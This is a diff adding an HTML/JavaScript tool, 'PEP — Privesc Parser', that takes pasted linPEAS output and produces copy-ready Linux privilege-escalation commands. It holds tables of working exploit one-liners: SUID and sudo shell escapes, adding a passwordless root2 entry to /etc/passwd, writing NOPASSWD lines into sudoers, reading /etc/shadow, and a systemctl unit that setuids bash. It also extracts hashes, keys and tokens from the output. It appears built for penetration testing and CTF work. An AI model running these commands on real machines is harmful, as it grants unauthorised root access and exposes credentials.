@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PEP — Privesc Parser</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; min-height: 100vh; }
+
+.header { background: #161b22; border-bottom: 1px solid #30363d; padding: 16px 24px; display: flex; align-items: center; gap: 12px; }
+.header h1 { font-size: 18px; color: #f85149; }
+.badge { background: #21262d; border: 1px solid #30363d; border-radius: 12px; padding: 2px 10px; font-size: 11px; color: #9baab6; }
+
+.container { padding: 20px 24px; }
+
+.input-area { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 16px; margin-bottom: 16px; }
+.input-area label { display: block; font-size: 12px; color: #9baab6; margin-bottom: 8px; text-transform: uppercase; letter-spacing: .5px; }
+textarea { width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-family: monospace; font-size: 12px; padding: 10px; resize: vertical; min-height: 140px; outline: none; }
+textarea:focus { border-color: #f85149; }
+
+.btn { background: #238636; color: #fff; border: none; border-radius: 6px; padding: 8px 18px; font-size: 13px; cursor: pointer; transition: background .2s; }
+.btn:hover { background: #2ea043; }
+.btn-secondary { background: #21262d; border: 1px solid #30363d; color: #c9d1d9; }
+.btn-secondary:hover { background: #30363d; }
+.btn-blue { background: #1f6feb; }
+.btn-blue:hover { background: #388bfd; }
+
+.cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 12px; margin-bottom: 20px; }
+.card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 14px; text-align: center; }
+.card .num { font-size: 28px; font-weight: bold; color: #58a6ff; }
+.card .label { font-size: 11px; color: #9baab6; margin-top: 4px; text-transform: uppercase; }
+.card.danger .num { color: #f85149; }
+.card.warn .num { color: #d29922; }
+.card[data-scroll] { cursor: pointer; transition: border-color .15s, transform .12s; }
+.card[data-scroll]:hover { border-color: #f85149; transform: translateY(-2px); }
+
+.table-wrap { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; margin-bottom: 16px; }
+.table-wrap.hot { border-color: #f85149; }
+.table-header { padding: 12px 16px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }
+.table-header h3 { font-size: 14px; color: #c9d1d9; }
+table { width: 100%; border-collapse: collapse; font-size: 12px; }
+th { background: #21262d; padding: 8px 12px; text-align: left; color: #9baab6; font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: .5px; }
+td { padding: 8px 12px; border-top: 1px solid #21262d; word-break: break-all; }
+tr:hover td { background: #1c2128; }
+
+.tag { display: inline-block; background: #1b2a3b; color: #58a6ff; border-radius: 4px; padding: 1px 6px; font-size: 11px; margin: 1px; }
+.tag.red    { background: #3d1f1f; color: #f85149; }
+.tag.green  { background: #0b3535; color: #29d4bf; }
+.tag.yellow { background: #2d2a15; color: #d29922; }
+
+.empty { color: #9baab6; text-align: center; padding: 32px; font-size: 13px; }
+
+.modal-bg { display:none; position:fixed; inset:0; background:rgba(0,0,0,.7); z-index:100; align-items:center; justify-content:center; }
+.modal-bg.open { display:flex; }
+.modal { background:#161b22; border:1px solid #30363d; border-radius:10px; padding:24px; width:90%; max-width:600px; max-height:80vh; overflow-y:auto; }
+.modal h2 { font-size:15px; color:#c9d1d9; margin-bottom:16px; }
+.modal pre { background:#0d1117; border:1px solid #30363d; border-radius:6px; padding:14px; font-size:11px; color:#c9d1d9; white-space:pre-wrap; word-break:break-all; max-height:400px; overflow-y:auto; }
+.modal-footer { display:flex; gap:8px; margin-top:14px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <span>🔺</span>
+  <h1>PEP — Privesc Parser</h1>
+  <span class="badge">linPEAS · red only</span>
+  <span style="margin-left:auto;font-size:12px;color:#30363d;letter-spacing:1px">crafted by <span style="color:#58a6ff;font-weight:600">melmols 🐱</span></span>
+</div>
+
+<div class="container">
+  <div class="input-area">
+    <label>Paste linPEAS Output</label>
+    <textarea id="peas-input" placeholder="Paste your linpeas output here...
+
+Run:  ./linpeas.sh | tee linpeas_out.txt  then paste the file.
+ANSI color codes required for red line detection."></textarea>
+    <div style="display:flex;gap:8px;margin-top:10px">
+      <button class="btn" onclick="parsePeas()">Parse Output</button>
+      <button class="btn btn-blue" onclick="exportMd()">Export Markdown</button>
+      <button class="btn btn-secondary" onclick="clearPeas()">Clear</button>
+    </div>
+  </div>
+  <div id="peas-results"></div>
+</div>
+
+<div class="modal-bg" id="md-modal">
+  <div class="modal">
+    <h2>Markdown Export</h2>
+    <pre id="md-content"></pre>
+    <div class="modal-footer">
+      <button class="btn" onclick="copyMd()">Copy to Clipboard</button>
+      <button class="btn btn-secondary" onclick="document.getElementById('md-modal').classList.remove('open')">Close</button>
+    </div>
+  </div>
+</div>
+
+<script>
+const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+
+const GTFO = new Set([
+  'bash','sh','dash','zsh','ksh','fish','tcsh','csh',
+  'python','python2','python3',
+  'python2.6','python2.7',
+  'python3.5','python3.6','python3.7','python3.8','python3.9','python3.10','python3.11','python3.12',
+  'perl','perl5','ruby','lua','lua5.1','lua5.2','lua5.3','lua5.4',
+  'php','php5','php7','php7.4','php8','php8.1','php8.2',
+  'node','nodejs',
+  'find','nmap','vim','vi','nano','less','more','man','pico','joe','ed','emacs',
+  'awk','gawk','mawk','sed','tee','cat','head','tail','nl','od','xxd','hexdump','base64','base32','iconv',
+  'cp','mv','dd','install','scp',
+  'curl','wget','nc','netcat','ncat','socat',
+  'tar','zip','gzip','bzip2','7z','ar','cpio','xz','lzma',
+  'openssl','ssh','sftp',
+  'docker','lxc','lxd','podman',
+  'env','xargs','time','watch','nice','nohup','timeout','stdbuf',
+  'strace','ltrace','gdb',
+  'git','svn','rsync',
+  'screen','tmux','script',
+  'apt','apt-get','pip','pip3','gem','npm','yarn',
+  'mysql','psql','sqlite3',
+  'su','sudo','pkexec',
+  'mount','umount','chmod','chown','chattr',
+  'journalctl','systemctl',
+  'ftp','tftp',
+  'ld.so','ld-linux.so',
+  'diff','make','gcc','g++','cc',
+  'expect','tclsh','wish','irb','jjs','jrunscript',
+  'valgrind','setarch','nsenter','unshare','tcpdump',
+  'w3m','links','lynx',
+  'run-parts','start-stop-daemon',
+  'rpm','yum','dnf','dpkg','snap','flatpak','pacman',
+  'write','wall','at','xz','restic','rclone','jq',
+  'uudecode','readelf','strings','nm','objdump','logsave',
+]);
+
+const DANGER_CAPS = new Set([
+  'cap_setuid','cap_setgid','cap_dac_override','cap_dac_read_search',
+  'cap_net_raw','cap_net_admin','cap_sys_admin','cap_sys_ptrace',
+  'cap_sys_module','cap_chown','cap_fowner',
+]);
+
+// Ready-to-run SUID exploit commands. PATH = actual binary path.
+const SUID_CMDS = {
+  python:   p=>`${p} -c 'import os; os.execl("/bin/sh", "sh", "-p")'`,
+  python2:  p=>`${p} -c 'import os; os.execl("/bin/sh", "sh", "-p")'`,
+  python3:  p=>`${p} -c 'import os; os.execl("/bin/sh", "sh", "-p")'`,
+  bash:     p=>`${p} -p`,
+  sh:       p=>`${p} -p`,
+  dash:     p=>`${p} -p`,
+  zsh:      p=>`${p} -p`,
+  find:     p=>`${p} . -exec /bin/sh -p \\; -quit`,
+  vim:      p=>`${p} -c ':!/bin/sh -p'`,
+  vi:       p=>`${p} -c ':!/bin/sh -p'`,
+  nano:     p=>`# nano: open /etc/sudoers → add: yourusername ALL=(ALL) NOPASSWD:ALL`,
+  less:     p=>`${p} /etc/passwd   # then type: !/bin/sh`,
+  more:     p=>`${p} /etc/passwd   # then type: !/bin/sh`,
+  man:      p=>`${p} man           # then type: !/bin/sh`,
+  awk:      p=>`${p} 'BEGIN {system("/bin/sh")}'`,
+  nmap:     p=>`${p} --interactive # then type: !sh   (only works on old nmap)`,
+  perl:     p=>`${p} -e 'use POSIX; POSIX::setuid(0); exec "/bin/sh";'`,
+  ruby:     p=>`${p} -e 'Process::Sys.setuid(0); exec "/bin/sh"'`,
+  php:      p=>`${p} -r "pcntl_exec('/bin/sh', ['-p']);"`,
+  node:     p=>`${p} -e "require('child_process').spawn('/bin/sh',['-p'],{stdio:'inherit'})"`,
+  nodejs:   p=>`${p} -e "require('child_process').spawn('/bin/sh',['-p'],{stdio:'inherit'})"`,
+  env:      p=>`${p} /bin/sh -p`,
+  tee:      p=>`echo 'root2::0:0:root:/root:/bin/bash' | ${p} -a /etc/passwd`,
+  cp:       p=>`echo 'root2::0:0:root:/root:/bin/bash' >> /tmp/pw && ${p} /tmp/pw /etc/passwd`,
+  dd:       p=>`echo 'root2::0:0:root:/root:/bin/bash' | ${p} of=/etc/passwd oflag=append conv=notrunc`,
+  curl:     p=>`${p} file:///etc/shadow`,
+  wget:     p=>`${p} -O- file:///etc/shadow`,
+  tar:      p=>`${p} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`,
+  docker:   p=>`${p} run -v /:/mnt --rm -it alpine chroot /mnt sh`,
+  git:      p=>`${p} -p help config  # then type: !/bin/sh`,
+  journalctl: p=>`${p}              # pipe output to less, then: !/bin/sh`,
+  systemctl: p=>`TF=$(mktemp).service; echo '[Service]\\nExecStart=/bin/bash -c "chmod +s /bin/bash"\\n[Install]\\nWantedBy=multi-user.target' > $TF; ${p} link $TF; ${p} enable $(basename $TF); ${p} start $(basename $TF); /bin/bash -p`,
+  screen:   p=>`# screen < 4.5.0 local privesc: https://www.exploit-db.com/exploits/41154`,
+  strace:   p=>`${p} -o /dev/null -e execve /bin/sh -p`,
+  tcpdump:  p=>`echo 'id' > /tmp/x; chmod +x /tmp/x; ${p} -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/x`,
+  openssl:  p=>`${p} enc -in /etc/shadow`,
+  socat:    p=>`${p} stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane`,
+};
+
+// Exploit commands for dangerous capabilities
+const CAP_CMDS = {
+  cap_setuid:         b=>`# setuid cap on ${b}:\n${b} -c 'import os; os.setuid(0); os.system("/bin/bash")'`,
+  cap_setgid:         b=>`# setgid cap on ${b}:\n${b} -c 'import os; os.setgid(0); os.system("/bin/bash")'`,
+  cap_dac_override:   b=>`# dac_override on ${b} — can write any file:\n${b} -c 'open("/etc/sudoers","a").write("\\nyouruser ALL=(ALL) NOPASSWD:ALL\\n")'`,
+  cap_dac_read_search:b=>`# dac_read_search on ${b} — can read any file:\n${b} -c 'print(open("/etc/shadow").read())'`,
+  cap_sys_admin:      _=>`# sys_admin — mount namespace escape or OverlayFS exploit`,
+  cap_sys_module:     _=>`# sys_module — load kernel module: insmod /tmp/rootkit.ko`,
+  cap_sys_ptrace:     _=>`# sys_ptrace — inject into root process: https://github.com/0x00-0x00/inject-ptrace`,
+  cap_net_raw:        _=>`# net_raw — can sniff/spoof traffic (tcpdump, ARP poison)`,
+  cap_net_admin:      _=>`# net_admin — can modify routes/interfaces (pivot opportunity)`,
+  cap_chown:          b=>`${b} -c 'import os; os.chown("/etc/passwd", os.getuid(), os.getgid())'`,
+  cap_fowner:         b=>`${b} -c 'import os; os.chmod("/etc/shadow", 0o777)'`,
+};
+
+let pepState = null;
+let _qwCmds = [];
+
+// Shorten verbose linpeas section names
+function shortSection(s) {
+  return s.replace(/\s*\(limit\s*\d+\)/gi, '')
+          .replace(/\bSearching\b/gi, 'Search')
+          .replace(/\bpasswords\b/gi, 'passwords')
+          .replace(/\binside\b/gi, 'in')
+          .trim()
+          .slice(0, 35);
+}
+
+// Split "filepath:content" lines into parts for cleaner display
+function splitFinding(text) {
+  const m = text.match(/^(\/[^:\s][^:]*):(.{4,})$/);
+  if (m) return { file: m[1], content: m[2].trim() };
+  return { file: '', content: text };
+}
+
+function parsePeas() {
+  const raw = document.getElementById('peas-input').value;
+  if (!raw.trim()) return;
+
+  const ANSI_RE = /\x1b\[[0-9;]*[mGKHFABCDsuJr]/g;
+  const strip   = s => s.replace(ANSI_RE, '');
+  const isRed   = l => /\x1b\[(?:[0-9]+;)*31m/.test(l);
+  const hasAnsi = /\x1b\[/.test(raw);
+
+  if (!hasAnsi) {
+    document.getElementById('peas-results').innerHTML = `
+      <div style="background:#2d2a15;border:1px solid #d29922;border-radius:8px;padding:16px;font-size:13px;color:#d29922;line-height:1.7">
+        No ANSI color codes detected — cannot identify red findings.<br>
+        Run linpeas with color output:<br>
+        <code style="color:#c9d1d9;background:#0d1117;padding:4px 8px;border-radius:4px;display:inline-block;margin-top:6px">./linpeas.sh | tee linpeas_out.txt</code><br>
+        then paste the contents of <code style="color:#c9d1d9">linpeas_out.txt</code>
+      </div>`;
+    return;
+  }
+
+  const lines    = raw.split('\n');
+  let   section  = 'General';
+  const redLines = [];
+
+  for (const line of lines) {
+    const clean = strip(line).trim();
+    if (!clean) continue;
+
+    // Major category header:  ═════╣ Category ╠═════
+    if (/╣.+╠/.test(clean) && /═{5,}/.test(clean)) {
+      const m = clean.match(/╣\s*(.+?)\s*╠/);
+      if (m) { section = m[1].trim(); continue; }
+    }
+
+    // Subsection header:  ╔══════════╣ Name
+    if (/╔[═╗]+╣/.test(clean)) {
+      section = clean.replace(/[╔╗╚╝╠╣║═─]+/g, '').trim() || section;
+      continue;
+    }
+
+    if (/hacktricks\.xyz/.test(clean) || /^[═─╚╔║╠╣╗╝\s]+$/.test(clean)) continue;
+
+    if (isRed(line)) redLines.push({ section: shortSection(section), text: clean });
+  }
+
+  if (!redLines.length) {
+    document.getElementById('peas-results').innerHTML = `<div class="empty">No red findings found. Check that your output includes ANSI color codes.</div>`;
+    return;
+  }
+
+  // Quick wins from red lines only
+  const quickWins = [];
+  const seenQW = new Set();
+
+  for (const f of redLines) {
+    const t = f.text;
+    const sec = f.section.toLowerCase();
+
+    // SUID GTFOBins
+    if (/^-[rwxsStT-]{9}\s/.test(t) && /[sS]/.test(t.slice(0,10))) {
+      const path = t.match(/\s(\/[^\s]+)\s*$/)?.[1] || t.match(/(\/[^\s]+)/)?.[1] || '';
+      if (path && !seenQW.has(path)) {
+        const rawName = path.split('/').pop();
+        const variants = [rawName, rawName.replace(/[\d.]+$/, ''), rawName.replace(/[0-9.]+$/, '')];
+        const matchedName = variants.find(n => GTFO.has(n));
+        if (matchedName) {
+          seenQW.add(path);
+          const cmdFn = SUID_CMDS[matchedName];
+          const cmd = cmdFn ? cmdFn(path) : `# see https://gtfobins.github.io/gtfobins/${matchedName}/#suid`;
+          quickWins.push({ type: 'SUID', text: path, cmd });
+        }
+      }
+    }
+
+    // Sudo NOPASSWD
+    if (/NOPASSWD/i.test(t) && !seenQW.has(t)) {
+      seenQW.add(t);
+      // Try to extract the allowed binary
+      const sudoBin = t.match(/NOPASSWD\s*:\s*(\/[^\s,]+)/i)?.[1] || t.match(/ALL=.*?NOPASSWD.*?(\/[^\s,]+)/i)?.[1];
+      let cmd = 'sudo -l  # confirm the allowed command';
+      if (sudoBin) {
+        const bname = sudoBin.split('/').pop().replace(/[\d.]+$/, '');
+        const cmdFn = SUID_CMDS[bname];
+        cmd = cmdFn ? `sudo ${cmdFn(sudoBin)}` : `sudo ${sudoBin}  # check https://gtfobins.github.io/gtfobins/${bname}/#sudo`;
+      }
+      quickWins.push({ type: 'Sudo NOPASSWD', text: t, cmd });
+    }
+
+    // Dangerous capabilities
+    const capHit = [...DANGER_CAPS].find(d => t.toLowerCase().includes(d));
+    if (capHit && /cap_[a-z_]+/.test(t) && !seenQW.has(t)) {
+      seenQW.add(t);
+      // Try to extract the binary path that has the cap
+      const capBin = t.match(/(\/[^\s=+]+)/)?.[1] || 'python3';
+      const bname = capBin.split('/').pop().replace(/[\d.]+$/, '');
+      const cmdFn = CAP_CMDS[capHit];
+      const cmd = cmdFn ? cmdFn(capBin) : `# ${capHit} on ${capBin} — see GTFOBins`;
+      quickWins.push({ type: 'Capability', text: t, cmd });
+    }
+
+    // Writable /etc/passwd or /etc/shadow — only if line shows actual write perms
+    // or section explicitly says writable, not just a reference to the file
+    if (/\/etc\/(passwd|shadow|sudoers)/.test(t) && !seenQW.has(t)) {
+      const showsWritable =
+        /world[- ]?writable|is writable/i.test(t) ||
+        sec.includes('writable') ||
+        /^-[rwx-]{2}[w]/i.test(t) ||    // group-writable in perms string
+        /^-[rwx-]{5}[w]/i.test(t);       // world-writable in perms string
+      if (showsWritable) {
+        seenQW.add(t);
+        const file = t.match(/\/etc\/(passwd|shadow|sudoers)/)?.[0];
+        const cmd = file === '/etc/passwd'
+          ? `echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd && su root2`
+          : file === '/etc/shadow'
+          ? `# Overwrite root hash:\npython3 -c "import crypt; print(crypt.crypt('pwned','\\$6\\$salt'))"  # then replace root hash in /etc/shadow`
+          : `# Add to sudoers:\necho 'yourusername ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`;
+        quickWins.push({ type: 'Writable File', text: t, cmd });
+      }
+    }
+  }
+
+  // Credentials — only actual hashes, keys, and real password values
+  const creds = redLines.filter(f => {
+    const t = f.text;
+    // Shadow/passwd hash (root:$6$salt$hash or root:$1$...)
+    if (/^[a-z_][a-z0-9_.-]*:\$[156yab]\$[a-zA-Z0-9./+]{10,}/.test(t)) return true;
+    // htpasswd hash formats ($apr1$, {SHA}, etc.)
+    if (/^[a-z_][a-z0-9_.-]*:(\$apr1\$|\{SHA\}|\{SSHA\})[a-zA-Z0-9+/=]{8,}/i.test(t)) return true;
+    // Private key header/file reference
+    if (/BEGIN\s+(RSA|EC|OPENSSH|PRIVATE|DSA)\s+KEY/i.test(t)) return true;
+    if (/\b(id_rsa|id_ecdsa|id_ed25519)\b/.test(t)) return true;
+    // Actual password assignment (value ≥8 chars, not a keyword)
+    if (/\bpassword\s*[=:]\s*(?!none\b|null\b|true\b|false\b|required\b|optional\b)[^\s]{8,}/i.test(t)) return true;
+    // config secret / api_key / token with real value
+    if (/\b(secret|api[_-]?key|private[_-]?key)\s*[=:]\s*[a-zA-Z0-9+/=_.-]{10,}/i.test(t)) return true;
+    if (/\btoken\s*[=:]\s*[a-zA-Z0-9+/=_.-]{16,}/i.test(t)) return true;
+    return false;
+  });
+
+  pepState = { redLines, quickWins, creds };
+  renderPeas(pepState);
+}
+
+function renderPeas({ redLines, quickWins, creds }) {
+  _qwCmds = quickWins.map(w => w.cmd);
+  let html = '';
+
+  // Cards
+  html += `<div class="cards">
+    <div class="card danger" data-scroll="pep-quickwins"><div class="num">${quickWins.length}</div><div class="label">Attack Surface</div></div>
+    <div class="card danger" data-scroll="pep-red"><div class="num">${redLines.length}</div><div class="label">Red Findings</div></div>
+    <div class="card ${creds.length ? 'warn' : ''}" data-scroll="pep-creds"><div class="num">${creds.length}</div><div class="label">Creds Found</div></div>
+  </div>`;
+
+  // Attack Surface
+  if (quickWins.length) {
+    html += `<div class="table-wrap hot" id="pep-quickwins" style="margin-bottom:16px">
+      <div class="table-header"><h3>Attack Surface</h3><span style="font-size:11px;color:#f85149">${quickWins.length} vector(s)</span></div>
+      <table><thead><tr><th style="width:100px">Type</th><th style="width:200px">Finding</th><th>Exploit Command</th></tr></thead><tbody>`;
+    for (let i = 0; i < quickWins.length; i++) {
+      const w = quickWins[i];
+      html += `<tr>
+        <td><span class="tag red">${esc(w.type)}</span></td>
+        <td><code style="font-size:10px;color:#f85149;word-break:break-all">${esc(w.text.slice(0,160))}</code></td>
+        <td>
+          <pre style="background:#0d1117;border:1px solid #30363d;border-radius:4px;padding:6px 10px;font-size:11px;color:#3fb950;margin:0;white-space:pre-wrap;word-break:break-all">${esc(w.cmd)}</pre>
+          <button onclick="cpQW(this,${i})" style="margin-top:4px;font-size:10px;padding:2px 8px;background:#21262d;border:1px solid #30363d;color:#c9d1d9;border-radius:4px;cursor:pointer">Copy</button>
+        </td>
+      </tr>`;
+    }
+    html += `</tbody></table></div>`;
+  }
+
+  // Credentials — hashes, keys, actual password values only
+  if (creds.length) {
+    html += `<div class="table-wrap" id="pep-creds" style="margin-bottom:16px">
+      <div class="table-header"><h3>Credentials &amp; Hashes</h3><span style="font-size:11px;color:#9baab6">${creds.length} found</span></div>
+      <table><thead><tr><th style="width:130px">File / Source</th><th>Value</th></tr></thead><tbody>`;
+    for (const f of creds) {
+      const { file, content } = splitFinding(f.text);
+      const src = file ? file.split('/').slice(-2).join('/') : f.section;
+      html += `<tr>
+        <td style="font-size:10px;color:#6e7681;white-space:nowrap" title="${esc(file)}">${esc(src)}</td>
+        <td><code style="font-size:11px;color:#d29922;word-break:break-all">${esc((file ? content : f.text).slice(0, 300))}</code></td>
+      </tr>`;
+    }
+    html += `</tbody></table></div>`;
+  }
+
+  // All red findings
+  html += `<div class="table-wrap" id="pep-red" style="margin-bottom:16px">
+    <div class="table-header">
+      <h3>Red Findings</h3>
+      <span style="font-size:11px;color:#9baab6">${redLines.length} total${redLines.length > 500 ? ' — showing 500' : ''}</span>
+    </div>
+    <table><thead><tr><th>Section</th><th>File</th><th>Finding</th></tr></thead><tbody>`;
+  for (const f of redLines.slice(0, 500)) {
+    const { file, content } = splitFinding(f.text);
+    html += `<tr>
+      <td style="font-size:10px;color:#9baab6;white-space:nowrap;max-width:130px;overflow:hidden">${esc(f.section)}</td>
+      <td style="font-size:10px;color:#6e7681;white-space:nowrap;max-width:180px;overflow:hidden" title="${esc(file)}">${file ? esc(file.split('/').slice(-2).join('/')) : ''}</td>
+      <td style="font-size:11px"><code>${esc(content.slice(0, 280))}</code></td>
+    </tr>`;
+  }
+  html += `</tbody></table></div>`;
+
+  document.getElementById('peas-results').innerHTML = html;
+}
+
+document.addEventListener('click', e => {
+  const card = e.target.closest('.card[data-scroll]');
+  if (card) document.getElementById(card.dataset.scroll)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+});
+
+function exportMd() {
+  if (!pepState) { alert('Parse something first!'); return; }
+  const { redLines, quickWins, creds } = pepState;
+  let md = `# LinPEAS — Red Findings\n\n`;
+
+  if (quickWins.length) {
+    md += `## Attack Surface\n\n`;
+    quickWins.forEach(w => {
+      md += `### ${w.type}: \`${w.text.slice(0,100)}\`\n\`\`\`bash\n${w.cmd}\n\`\`\`\n\n`;
+    });
+  }
+  if (creds.length) {
+    md += `## Credentials / Secrets\n\n`;
+    creds.forEach(f => { md += `- [${f.section}] \`${f.text.slice(0,200)}\`\n`; });
+    md += '\n';
+  }
+  md += `## Red Findings (${redLines.length})\n\n`;
+  redLines.forEach(f => { md += `- [${f.section}] \`${f.text.slice(0,200)}\`\n`; });
+
+  document.getElementById('md-content').textContent = md;
+  document.getElementById('md-modal').classList.add('open');
+}
+
+function copyMd() {
+  navigator.clipboard.writeText(document.getElementById('md-content').textContent);
+  const btn = document.querySelector('#md-modal .btn');
+  btn.textContent = 'Copied!';
+  setTimeout(() => btn.textContent = 'Copy to Clipboard', 1500);
+}
+
+function cpQW(btn, idx) {
+  navigator.clipboard.writeText(_qwCmds[idx] || '').then(() => {
+    btn.textContent = 'Copied!';
+    setTimeout(() => btn.textContent = 'Copy', 1400);
+  });
+}
+
+function clearPeas() {
+  document.getElementById('peas-input').value = '';
+  document.getElementById('peas-results').innerHTML = '';
+  pepState = null;
+  _qwCmds = [];
+}
+
+document.getElementById('md-modal').addEventListener('click', function(e) {
+  if (e.target === this) this.classList.remove('open');
+});
+</script>
+</body>
+</html>
